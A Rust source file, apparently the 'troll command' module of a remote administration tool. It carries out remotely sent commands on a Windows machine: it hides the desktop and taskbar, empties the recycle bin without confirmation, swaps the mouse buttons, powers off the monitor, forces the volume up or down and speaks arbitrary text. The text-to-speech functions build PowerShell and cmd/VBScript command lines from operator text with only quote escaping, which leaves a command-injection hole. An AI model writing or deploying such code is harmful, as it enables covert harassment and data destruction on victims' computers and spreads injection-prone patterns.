// To enable proper volume control, add the winmm feature to winapi in Cargo.toml:
// winapi = { version = "0.3", features = ["winuser", "shellapi", "winmm"] }
// Then you can replace set_volume_alternative with the commented-out set_volume function
// that uses waveOutSetVolume for direct volume control.
use common::packets::TrollCommand;
use std::ptr::null_mut;
use winapi::um::winuser::{
    SW_HIDE, SW_SHOW, ShowWindow, FindWindowA, FindWindowExA,
    GetDesktopWindow, SetForegroundWindow, GetShellWindow,
    EnumWindows, SendMessageA, GetForegroundWindow, keybd_event,
    SendNotifyMessageA, PostMessageA, SystemParametersInfoA,
    SPI_SETMOUSESPEED, SPI_GETMOUSESPEED,
    MOUSEEVENTF_ABSOLUTE, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP,
    MOUSEEVENTF_MOVE, MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP,
    VK_ESCAPE, KEYEVENTF_KEYUP, WM_SYSCOMMAND, SC_MONITORPOWER,
    
    // Add virtual key codes for volume control
    VK_VOLUME_UP, VK_VOLUME_DOWN, VK_VOLUME_MUTE
};
use winapi::shared::windef::HWND;
use winapi::shared::minwindef::{BOOL, LPARAM, UINT, DWORD, TRUE, FALSE};
use std::process::Command;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::iter::once;
use std::thread;
use winapi::um::shellapi::{SHEmptyRecycleBinW, SHERB_NOCONFIRMATION, SHERB_NOPROGRESSUI, SHERB_NOSOUND};
use std::ptr;

pub fn execute_troll_command(command: &TrollCommand) {
    match command {
        TrollCommand::HideDesktop => toggle_desktop(false),
        TrollCommand::ShowDesktop => toggle_desktop(true),
        TrollCommand::HideTaskbar => toggle_taskbar(false),
        TrollCommand::ShowTaskbar => toggle_taskbar(true),
        TrollCommand::HideNotify => toggle_notification_area(false),
        TrollCommand::ShowNotify => toggle_notification_area(true),
        TrollCommand::FocusDesktop => focus_desktop(),
        TrollCommand::EmptyTrash => empty_recycle_bin(),
        TrollCommand::RevertMouse => toggle_invert_mouse(true),
        TrollCommand::NormalMouse => toggle_invert_mouse(false),
        TrollCommand::MonitorOff => toggle_monitor(false),
        TrollCommand::MonitorOn => toggle_monitor(true),
        TrollCommand::MaxVolume => max_volume(),
        TrollCommand::MinVolume => min_volume(),
        TrollCommand::MuteVolume => mute_volume(),
        TrollCommand::UnmuteVolume => unmute_volume(),
        TrollCommand::SpeakText(ref text) => speak_text(text),
    }
}

fn toggle_desktop(show: bool) {
    // Use the appropriate visibility flag based on the 'show' parameter
    let visibility = if show { SW_SHOW } else { SW_HIDE };
    let action_name = if show { "show" } else { "hide" };
    
    // Try to toggle the desktop icons first
    if !try_toggle_desktop_icons(visibility) && !try_toggle_desktop_window(visibility) {
        println!("Failed to {} desktop after trying all methods", action_name);
    }
}

// Try to toggle just the desktop icons (SysListView32)
fn try_toggle_desktop_icons(visibility: i32) -> bool {
    unsafe {
        // First try to find the desktop icons directly
        let prog_man = GetShellWindow();
        if prog_man.is_null() {
            println!("Failed to get shell window");
            return false;
        }
        
        // Look for SHELLDLL_DefView under Program Manager
        let shell_view = FindWindowExA(
            prog_man,
            null_mut(),
            b"SHELLDLL_DefView\0".as_ptr() as *const i8,
            null_mut()
        );
        
        if !shell_view.is_null() {
            // Find SysListView32 (desktop icons) under SHELLDLL_DefView
            let desktop_icons = FindWindowExA(
                shell_view,
                null_mut(),
                b"SysListView32\0".as_ptr() as *const i8,
                b"FolderView\0".as_ptr() as *const i8
            );
            
            if !desktop_icons.is_null() {
                println!("Found desktop icons, toggling SysListView32");
                ShowWindow(desktop_icons, visibility);
                
                // If showing, also bring to foreground
                if visibility == SW_SHOW {
                    SetForegroundWindow(desktop_icons);
                }
                
                return true;
            }
        }
        
        // If we can't find it under ProgMan, try searching for WorkerW > SHELLDLL_DefView > SysListView32
        let mut worker_w = FindWindowExA(
            null_mut(),
            null_mut(),
            b"WorkerW\0".as_ptr() as *const i8,
            null_mut()
        );
        
        // Try multiple WorkerW windows until we find one with SHELLDLL_DefView
        while !worker_w.is_null() {
            let shell_view = FindWindowExA(
                worker_w,
                null_mut(),
                b"SHELLDLL_DefView\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !shell_view.is_null() {
                let desktop_icons = FindWindowExA(
                    shell_view,
                    null_mut(),
                    b"SysListView32\0".as_ptr() as *const i8,
                    b"FolderView\0".as_ptr() as *const i8
                );
                
                if !desktop_icons.is_null() {
                    println!("Found desktop icons under WorkerW, toggling SysListView32");
                    ShowWindow(desktop_icons, visibility);
                    
                    // If showing, also bring to foreground
                    if visibility == SW_SHOW {
                        SetForegroundWindow(desktop_icons);
                    }
                    
                    return true;
                }
            }
            
            // Try next WorkerW window
            worker_w = FindWindowExA(
                null_mut(),
                worker_w,
                b"WorkerW\0".as_ptr() as *const i8,
                null_mut()
            );
        }
    }
    
    // If we're here, we couldn't find the desktop icons
    println!("Could not find desktop icons");
    false
}

// Try to toggle the entire desktop window
fn try_toggle_desktop_window(visibility: i32) -> bool {
    unsafe {
        // Try toggling the WorkerW that contains SHELLDLL_DefView
        let mut worker_w = FindWindowExA(
            null_mut(),
            null_mut(),
            b"WorkerW\0".as_ptr() as *const i8,
            null_mut()
        );
        
        // Try multiple WorkerW windows
        while !worker_w.is_null() {
            let shell_view = FindWindowExA(
                worker_w,
                null_mut(),
                b"SHELLDLL_DefView\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !shell_view.is_null() {
                println!("Found WorkerW with SHELLDLL_DefView, toggling it");
                ShowWindow(worker_w, visibility);
                
                // If showing, also bring to foreground
                if visibility == SW_SHOW {
                    SetForegroundWindow(worker_w);
                }
                
                return true;
            }
            
            // Try next WorkerW window
            worker_w = FindWindowExA(
                null_mut(),
                worker_w,
                b"WorkerW\0".as_ptr() as *const i8,
                null_mut()
            );
        }
        
        // Last resort: Try to toggle the entire Program Manager
        let prog_man = GetShellWindow();
        if !prog_man.is_null() {
            println!("Toggling Program Manager as last resort");
            ShowWindow(prog_man, visibility);
            
            // If showing, also bring to foreground
            if visibility == SW_SHOW {
                SetForegroundWindow(prog_man);
            }
            
            return true;
        }
    }
    
    println!("Could not find any desktop window to toggle");
    false
}

fn toggle_taskbar(show: bool) {
    unsafe {
        let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
        
        if !taskbar.is_null() {
            let visibility = if show { SW_SHOW } else { SW_HIDE };
            let action_str = if show { "showing" } else { "hiding" };
            
            println!("Found taskbar, {}", action_str);
            ShowWindow(taskbar, visibility);
            return;
        }
        
        println!("Failed to toggle taskbar");
    }
}

fn toggle_notification_area(show: bool) {
    unsafe {
        let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
        
        if !taskbar.is_null() {
            // Find the notification area (system tray)
            let tray_notify_wnd = FindWindowExA(
                taskbar,
                null_mut(),
                b"TrayNotifyWnd\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !tray_notify_wnd.is_null() {
                let visibility = if show { SW_SHOW } else { SW_HIDE };
                let action_str = if show { "showing" } else { "hiding" };
                
                println!("Found notification area, {}", action_str);
                ShowWindow(tray_notify_wnd, visibility);
                return;
            }
        }
        
        println!("Failed to toggle notification area");
    }
}

fn focus_desktop() {
    unsafe {
        println!("Focusing desktop by sending Windows+D shortcut");
        
        // Try using a more reliable method with Windows+D shortcut
        // Virtual-Key Codes: VK_LWIN (0x5B), 'D' (0x44)
        const VK_LWIN: u8 = 0x5B;
        const VK_D: u8 = 0x44;
        
        // Press Windows key
        keybd_event(VK_LWIN, 0, 0, 0);
        // Press D key
        keybd_event(VK_D, 0, 0, 0);
        // Release D key
        keybd_event(VK_D, 0, KEYEVENTF_KEYUP, 0);
        // Release Windows key
        keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
        
        // Small delay to let Windows process the key combination
        thread::sleep(std::time::Duration::from_millis(100));
        
        // Alternatively, try another approach by directly focusing the desktop
        let desktop_window = GetDesktopWindow();
        if !desktop_window.is_null() {
            SetForegroundWindow(desktop_window);
            
            // Clear any selection with Escape key
            keybd_event(VK_ESCAPE as u8, 0, 0, 0);
            keybd_event(VK_ESCAPE as u8, 0, KEYEVENTF_KEYUP, 0);
        }
    }
}

fn empty_recycle_bin() {
    unsafe {
        // Convert the null string to wide string for the SHEmptyRecycleBinW function
        let null_string: Vec<u16> = OsStr::new("")
            .encode_wide()
            .chain(once(0))
            .collect();
        
        // SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND = 7
        let result = SHEmptyRecycleBinW(
            null_mut(),
            null_string.as_ptr(),
            SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND
        );
        
        if result == 0 {
            println!("Successfully emptied recycle bin");
        } else {
            println!("Failed to empty recycle bin, error code: {}", result);
        }
    }
}

fn toggle_invert_mouse(invert: bool) {
    unsafe {
        println!("Setting mouse buttons: {}", if invert { "swapped" } else { "normal" });
        
        // Use SystemParametersInfoA to swap mouse buttons
        // SPI_SETMOUSEBUTTONSWAP (0x0021)
        const SPI_SETMOUSEBUTTONSWAP: u32 = 0x0021;
        
        // The uiParam value is TRUE to swap buttons, FALSE for normal
        let swap_value = if invert { TRUE } else { FALSE };
        
        let result = SystemParametersInfoA(
            SPI_SETMOUSEBUTTONSWAP,
            swap_value as u32,
            null_mut(),
            0
        );
        
        if result == TRUE {
            println!("Successfully {} mouse buttons", if invert { "swapped" } else { "restored" });
        } else {
            println!("Failed to change mouse button configuration");
            
            // Fallback to registry method if the direct method fails
            let value = if invert { "1" } else { "0" };
            let output = Command::new("cmd")
                .args(["/C", &format!("reg add \"HKCU\\Control Panel\\Mouse\" /v SwapMouseButtons /t REG_SZ /d {} /f", value)])
                .output();
                
            match output {
                Ok(_) => println!("Used registry fallback to {} mouse buttons", if invert { "swap" } else { "restore" }),
                Err(e) => println!("Registry fallback failed: {}", e),
            }
        }
    }
}

fn toggle_monitor(on: bool) {
    unsafe {
        // SC_MONITORPOWER parameter:
        // -1 = on, 1 = low power, 2 = off
        let power_state = if on { -1 } else { 2 };
        
        println!("Toggling monitor power state: {}", if on { "ON" } else { "OFF" });
        
        // Try multiple approaches to ensure success
        
        // 1. Try using the foreground window
        let foreground_window = GetForegroundWindow();
        if !foreground_window.is_null() {
            println!("Sending SC_MONITORPOWER to foreground window");
            // Use PostMessage instead of SendMessage for better results
            PostMessageA(
                foreground_window,
                WM_SYSCOMMAND,
                SC_MONITORPOWER as usize,
                power_state as isize
            );
        }
        
        // 2. Also try with desktop window
        let desktop_window = GetDesktopWindow();
        if !desktop_window.is_null() {
            println!("Sending SC_MONITORPOWER to desktop window");
            PostMessageA(
                desktop_window,
                WM_SYSCOMMAND,
                SC_MONITORPOWER as usize,
                power_state as isize
            );
        }
        
        // 3. Try a fallback method by calling a PowerShell script for Windows 10+
        if !on {
            // Only for turning off the monitor
            let ps_script = r#"
                Add-Type -TypeDefinition '
                using System;
                using System.Runtime.InteropServices;
                public class MonitorControl {
                    [DllImport("user32.dll")]
                    public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
                    public static void TurnOffMonitor() {
                        SendMessage(-1, 0x112, 0xF170, 2);
                    }
                }
                '
                [MonitorControl]::TurnOffMonitor()
            "#;
            
            let output = Command::new("powershell.exe")
                .args(["-NoProfile", "-Command", ps_script])
                .output();
            
            match output {
                Ok(_) => println!("Attempted monitor power off via PowerShell"),
                Err(e) => println!("PowerShell fallback failed: {}", e),
            }
        }
    }
}

fn mute_volume() {
    println!("Muting volume using keyboard simulation");
    
    unsafe {
        // Send volume mute key directly
        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
        
        // Allow time for the key press to be processed
        thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn unmute_volume() {
    println!("Unmuting volume");
    
    // In Windows, pressing the mute key toggles the mute state
    // To ensure we're unmuted, we'll first check if we're currently muted,
    // then press the mute key only if needed
    
    // For this simple implementation, we'll just press the mute key once
    // which will toggle the current state
    unsafe {
        // Press mute key to toggle the mute state
        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
        
        // Allow time for the key press to be processed
        thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn max_volume() {
    println!("Setting volume to maximum");
    
    // Make sure we're unmuted first
    unmute_volume();
    thread::sleep(std::time::Duration::from_millis(100));
    
    // Then set to maximum by simulating volume up key presses
    unsafe {
        // Press volume up multiple times to reach maximum
        for _ in 0..50 {
            keybd_event(VK_VOLUME_UP as u8, 0, 0, 0);
            keybd_event(VK_VOLUME_UP as u8, 0, KEYEVENTF_KEYUP, 0);
            thread::sleep(std::time::Duration::from_millis(20));
        }
    }
}

fn min_volume() {
    println!("Setting volume to minimum (but not muted)");
    
    // Make sure we're unmuted first
    unmute_volume();
    thread::sleep(std::time::Duration::from_millis(100));
    
    // Set volume to 0 by simulating volume down key presses
    unsafe {
        // Press volume down multiple times to reach minimum
        for _ in 0..50 {
            keybd_event(VK_VOLUME_DOWN as u8, 0, 0, 0);
            keybd_event(VK_VOLUME_DOWN as u8, 0, KEYEVENTF_KEYUP, 0);
            thread::sleep(std::time::Duration::from_millis(20));
        }
    }
}

fn set_specific_volume(volume_percent: u8) {
    println!("Setting volume to specific level: {}%", volume_percent);
    
    // Make sure we're unmuted first
    unmute_volume();
    thread::sleep(std::time::Duration::from_millis(100));
    
    // First set volume to minimum (but not muted)
    min_volume();
    thread::sleep(std::time::Duration::from_millis(200));
    
    // Then increase to desired level
    unsafe {
        // Calculate how many key presses we need (approximate)
        // Assuming 50 key presses for 100% volume
        let key_presses = (volume_percent as usize * 50) / 100;
        
        // Simulate volume up key presses
        for _ in 0..key_presses {
            keybd_event(VK_VOLUME_UP as u8, 0, 0, 0);
            keybd_event(VK_VOLUME_UP as u8, 0, KEYEVENTF_KEYUP, 0);
            thread::sleep(std::time::Duration::from_millis(20));
        }
    }
}

// New function to handle text-to-speech
fn speak_text(text: &str) {
    println!("Speaking text using Windows SAPI: {}", text);
    
    // Method 1: Use PowerShell to speak the text (fallback method)
    let ps_text = text.replace("\"", "\\\""); // Escape quotes for PowerShell
    let ps_script = format!(
        "Add-Type -AssemblyName System.Speech; \
         $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; \
         $speak.Speak(\"{}\")", 
        ps_text
    );
    
    match Command::new("powershell.exe")
        .args(["-Command", &ps_script])
        .spawn() {
        Ok(_) => println!("Successfully launched PowerShell TTS"),
        Err(e) => {
            println!("Failed to use PowerShell TTS: {}", e);
            
            speak_text_with_sapi(text);
        }
    }
}

// Function to speak text using Windows SAPI directly
fn speak_text_with_sapi(text: &str) {
    // Use CMD to run a VBScript with SAPI
    let vbs_text = text.replace("\"", "\"\""); // Escape quotes for VBScript
    let vbs_script = format!(
        "CreateObject(\"SAPI.SpVoice\").Speak \"{}\"", 
        vbs_text
    );
    
    match Command::new("cmd.exe")
        .args(["/c", "echo", &vbs_script, ">", "temp_speech.vbs", "&&", "cscript", "//nologo", "temp_speech.vbs", "&&", "del", "temp_speech.vbs"])
        .spawn() {
        Ok(_) => println!("Successfully launched VBScript TTS"),
        Err(e) => println!("Failed to use VBScript TTS: {}", e),
    }
}
